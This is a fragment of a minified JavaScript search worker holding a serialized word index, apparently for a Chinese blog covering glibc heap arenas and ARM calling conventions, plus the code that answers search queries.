1\":{\"324\":1}}],[\"art\",{\"1\":{\"463\":2}}],[\"article\",{\"1\":{\"14\":1,\"156\":1,\"244\":1,\"263\":1}}],[\"arahat0师傅提醒俺\",{\"1\":{\"376\":1,\"498\":1}}],[\"ar\",{\"1\":{\"351\":10}}],[\"arch=\",{\"1\":{\"369\":2,\"473\":2,\"475\":3,\"479\":2,\"480\":2,\"481\":2,\"482\":2,\"483\":10,\"484\":3,\"485\":3,\"486\":3,\"488\":3,\"491\":2,\"503\":2,\"504\":2,\"505\":2}}],[\"arch\",{\"1\":{\"333\":1,\"469\":1}}],[\"around\",{\"1\":{\"324\":1}}],[\"area\",{\"1\":{\"390\":9,\"408\":9}}],[\"arean+88的地址了\",{\"1\":{\"360\":1}}],[\"arean\",{\"1\":{\"347\":2}}],[\"are\",{\"1\":{\"286\":1,\"324\":6,\"339\":2,\"390\":1,\"408\":1}}],[\"arena是在ptamlloc\",{\"1\":{\"351\":1}}],[\"arena设置成main\",{\"1\":{\"351\":1}}],[\"arena满了调用reused\",{\"1\":{\"350\":1}}],[\"arena函数中\",{\"1\":{\"348\":1}}],[\"arenas\",{\"1\":{\"347\":1,\"352\":1}}],[\"arena然后双向链表\",{\"1\":{\"343\":1}}],[\"arena+48\",{\"1\":{\"357\":1}}],[\"arena+152\",{\"1\":{\"311\":2}}],[\"arena+144\",{\"1\":{\"311\":2}}],[\"arena+136\",{\"1\":{\"311\":2}}],[\"arena+128\",{\"1\":{\"311\":6}}],[\"arena+120\",{\"1\":{\"311\":2}}],[\"arena+112\",{\"1\":{\"311\":10}}],[\"arena+104\",{\"1\":{\"311\":2}}],[\"arena+96这个位置\",{\"1\":{\"311\":1}}],[\"arena+96\",{\"1\":{\"311\":9}}],[\"arena+88的位置\",{\"1\":{\"357\":1}}],[\"arena+88\",{\"1\":{\"287\":1,\"357\":1}}],[\"arena的值\",{\"1\":{\"353\":1}}],[\"arena的地址\",{\"1\":{\"287\":1}}],[\"arena的实际地址\",{\"1\":{\"284\":1}}],[\"arena中获取分配区\",{\"1\":{\"351\":1}}],[\"arena中\",{\"1\":{\"284\":1}}],[\"arena\",{\"0\":{\"77\":1,\"217\":1,\"351\":1,\"352\":1,\"353\":2,\"354\":1},\"1\":{\"305\":2,\"313\":2,\"319\":1,\"321\":4,\"324\":3,\"346\":1,\"347\":5,\"348\":1,\"349\":6,\"350\":4,\"351\":10,\"352\":13,\"353\":16}}],[\"arm64\",{\"1\":{\"131\":1}}],[\"arm64架构大差不差\",{\"1\":{\"48\":1,\"188\":1}}],[\"arm中str\",{\"1\":{\"47\":1,\"187\":1}}],[\"arm中ldr是load\",{\"1\":{\"47\":1,\"187\":1}}],[\"armv8\",{\"0\":{\"48\":1,\"188\":1}}],[\"armv8是64位指令集合\",{\"1\":{\"46\":1,\"186\":1}}],[\"armv7\",{\"0\":{\"47\":1,\"187\":1}}],[\"armv7主要是32位指令集\",{\"1\":{\"46\":1,\"186\":1}}],[\"armv7和armv8架构比较\",{\"1\":{\"46\":1,\"186\":1}}],[\"armv7和armv8的区别\",{\"0\":{\"46\":1,\"186\":1}}],[\"arm\",{\"0\":{\"486\":1},\"1\":{\"46\":3,\"186\":3,\"486\":3}}],[\"arm架构函数调用规范\",{\"0\":{\"46\":1,\"186\":1}}],[\"argc\",{\"1\":{\"470\":2}}],[\"args\",{\"1\":{\"124\":1,\"125\":1,\"127\":1,\"134\":2,\"136\":1,\"479\":3}}],[\"arguments\",{\"1\":{\"123\":2,\"131\":1}}],[\"argv\",{\"1\":{\"37\":1,\"177\":1,\"470\":2}}],[\"arg为下标\",{\"1\":{\"36\":1,\"176\":1}}],[\"arg\",{\"1\":{\"36\":3,\"176\":3,\"281\":1,\"449\":4,\"458\":2}}],[\"arg参数作为参数这里plt\",{\"1\":{\"449\":1}}],[\"arg参数\",{\"1\":{\"36\":1,\"176\":1}}],[\"a\",{\"1\":{\"0\":1,\"24\":5,\"37\":1,\"121\":3,\"123\":4,\"124\":3,\"131\":1,\"166\":5,\"177\":1,\"242\":4,\"243\":4,\"258\":1,\"321\":2,\"324\":6,\"339\":2,\"342\":3,\"347\":3,\"349\":3,\"352\":9,\"353\":21,\"358\":1,\"359\":1,\"365\":12,\"366\":2,\"367\":1,\"368\":2,\"369\":17,\"373\":2,\"376\":5,\"377\":1,\"378\":3,\"380\":6,\"410\":2,\"417\":1,\"470\":5,\"471\":1,\"473\":2,\"475\":2,\"479\":1,\"480\":1,\"481\":2,\"485\":1,\"486\":2,\"488\":4,\"491\":6,\"495\":2,\"498\":5,\"499\":1,\"500\":3,\"502\":6,\"503\":14,\"504\":1,\"505\":1}}]],\"serializationVersion\":2}}")).map(([e,t])=>[e,zt(t,{fields:["h","t","c"],storeFields:["h","t","c"]})]));self.onmessage=({data:{type:e="all",query:t,locale:s,options:n}})=>{e==="suggest"?self.postMessage(st(t,v[s],n)):e==="search"?self.postMessage(et(t,v[s],n)):self.postMessage({suggestions:st(t,v[s],n),results:et(t,v[s],n)})};
//# sourceMappingURL=index.js.map
